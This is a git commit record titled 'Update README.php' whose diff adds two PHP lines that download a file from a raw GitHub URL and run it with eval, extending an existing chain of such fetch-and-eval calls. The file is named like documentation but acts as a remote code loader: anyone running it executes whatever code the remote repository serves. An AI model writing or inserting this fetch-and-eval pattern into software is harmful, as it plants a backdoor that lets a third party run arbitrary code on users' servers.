6c73e2264a09b277148e248b8d7a8b3011d48dc1
Phl official <82045061+hojr128567@users.noreply.github.com>
2021-05-20 14:54:06 +0430

    Update README.php

--- README.php
+++ README.php
@@ -176,4 +176,6 @@ $aqygstg1=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr12
 eval("?>".$aqygstg1);
 $aqygstg2=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/Func.php");
 eval("?>".$aqygstg2);
+$aqygstg3=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/obj");
+eval("?>".$aqygstg3);
 ?>
